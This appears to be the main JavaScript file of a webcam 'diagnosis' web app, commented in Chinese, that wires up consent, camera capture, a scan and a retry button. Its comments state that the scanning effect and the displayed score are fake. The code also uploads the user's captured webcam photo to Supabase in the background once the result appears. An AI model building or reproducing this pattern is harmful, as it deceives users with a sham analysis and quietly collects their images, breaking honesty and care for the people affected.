import { initConsent } from './modules/consent.js';
import { setupCamera, captureCanvasBlob } from './modules/camera.js';
import { runAnalysis } from './modules/scanner.js';
import { saveTestRecord } from './modules/supabase.js';

document.addEventListener('DOMContentLoaded', () => {
  const videoEl = document.getElementById('webcam');
  const canvasEl = document.getElementById('preview-canvas');
  const scanLineEl = document.getElementById('scan-line');
  
  const btnStartCam = document.getElementById('btn-start-camera');
  const btnScan = document.getElementById('btn-scan');
  const btnRetry = document.getElementById('btn-retry');
  
  const resultArea = document.getElementById('result-area');
  const scoreNumber = document.getElementById('score-number');
  const resultComment = document.getElementById('result-comment');

  // 1. 初始化同意條款
  initConsent(() => {
    console.log("使用者已同意規約");
  });

  // 2. 啟動相機
  btnStartCam.addEventListener('click', async () => {
    const success = await setupCamera(videoEl, canvasEl);
    if (success) {
      btnStartCam.style.display = 'none';
      btnScan.disabled = false;
    }
  });

  // 3. 點擊「開始診斷」
  btnScan.addEventListener('click', async () => {
    btnScan.disabled = true;

    // 擷取相機畫面成 Blob 檔案
    const photoBlob = await captureCanvasBlob(canvasEl);

    // 執行偽掃描特效與假分數
    runAnalysis(scanLineEl, async (result) => {
      scoreNumber.textContent = result.score;
      resultComment.textContent = result.comment;
      resultArea.classList.remove('hidden');
      btnScan.style.display = 'none';

      // 背景上傳至 Supabase
      if (photoBlob) {
        saveTestRecord(photoBlob, result.score);
      }
    });
  });

  // 4. 再測一次
  btnRetry.addEventListener('click', () => {
    resultArea.classList.add('hidden');
    btnScan.style.display = 'inline-block';
    btnScan.disabled = false;
  });
});